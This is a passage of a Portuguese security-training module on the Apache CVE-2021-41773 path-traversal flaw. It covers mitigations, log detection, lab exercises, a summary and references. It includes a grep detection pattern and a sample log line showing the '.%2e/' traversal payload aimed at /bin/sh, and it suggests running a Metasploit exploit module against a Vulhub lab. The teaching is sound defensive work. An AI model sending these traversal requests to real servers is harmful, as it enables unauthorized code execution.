+- **Desligar o CGI se você não usa.** Sem o `mod_cgi`/`mod_cgid` e sem `ScriptAlias`, a mesma travessia, no pior caso, vira leitura de arquivo (nota 7.5) em vez de RCE (9.8). É uma degradação enorme do impacto — mas a falha continua lá; só o patch a remove.
+- **Reduzir a superfície e a informação.** `ServerTokens Prod` esconde a versão exata no banner (atrasa o atacante, não o impede — é cosmético). Um WAF (Web Application Firewall) pode bloquear padrões de `%2e`/`../` na URL, mas atacantes contornam com codificações alternativas (a própria 42013 mostra como) — trate o WAF como rede de proteção, não como conserto.
+
+**Como detectar.** A tentativa deixa rastro no log de acesso do Apache: requisições com `%2e`, `../` ou `/cgi-bin/.` seguidas de caminhos estranhos, muitas vezes com status 500 (a travessia que bateu no CGI) ou 200 para `/bin/sh`. Vale um alerta para esse padrão:
+
+```console
+$ grep -E '/cgi-bin/\.%2e|%2e%2e|/bin/sh' /usr/local/apache2/logs/access_log
+192.168.0.10 - - [15/Oct/2021:12:00:03] "POST /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh HTTP/1.1" 200
+```
+
+O exemplo acima usa um IP genérico (`192.168.0.10`); no seu lab o IP de origem será o do próprio Kali na rede interna. O ponto é o **padrão** da URL, que é inconfundível.
+
+## 9. Exercícios
+
+Responda ao quiz (correção no servidor, conta para concluir o módulo). A tarefa prática que gera a flag é a da seção 5 (Desafios A e B).
+
+<Quiz task="quiz-final" />
+
+**Desafio extra (opcional, sem flag):** rode o módulo `exploit/multi/http/apache_normalize_path_rce` do Metasploit contra `vulhub` e use o `check` dele. Compare a requisição que ele envia (capture com o Wireshark do 2.6, ou leia a saída `set VERBOSE true`) com o `curl` que você montou. Onde os bytes batem?
+
+## 10. Resumo e glossário
+
+**Pontos-chave:**
+
+- Uma CVE é um **identificador**; em volta dela, leia CWE (tipo), CVSS (gravidade), NVD (ficha), KEV (exploração ativa) e EPSS (probabilidade) — cada um responde uma pergunta diferente.
+- A CVE-2021-41773 é um bug de **ordem de normalização de caminho**: decodificar `%2e` depois de filtrar `..` deixa a travessia `.%2e/` passar. Com CGI aliased, vira RCE (9.8); sem, leitura (7.5).
+- A correção da 2.4.50 foi **incompleta** (double encoding → CVE-2021-42013); só a **2.4.51** corrige. "Atualizei" não é sempre "corrigi".
+- Reproduzir no Vulhub prova o impacto **real** (que depende da configuração, não só da versão) antes de afirmá-lo — a diferença entre "possivelmente vulnerável" e "confirmado".
+- Defesa: **atualizar** corrige; fechar o acesso à raiz, desligar CGI e usar WAF **reduzem o impacto**. Nenhum substitui o patch.
+
+### Termos deste módulo
+
+<ModuleGlossary />
+
+### Para ir além
+
+- [Apache httpd — Security vulnerabilities 2.4](https://httpd.apache.org/security/vulnerabilities_24.html) — a fonte primária, com as datas e as versões que corrigem cada CVE.
+- [NVD — CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773) — a ficha técnica com CVSS primária (9.8) e secundária (7.5) e a CWE-22.
+- [CISA KEV Catalog](https://www.cisa.gov/known-exploited-vulnerabilities-catalog) — o catálogo de vulnerabilidades sob exploração ativa; procure a CVE-2021-41773.
+- [Repositório do Vulhub](https://github.com/vulhub/vulhub) — centenas de ambientes reproduzíveis para praticar outras CVEs com o mesmo método.
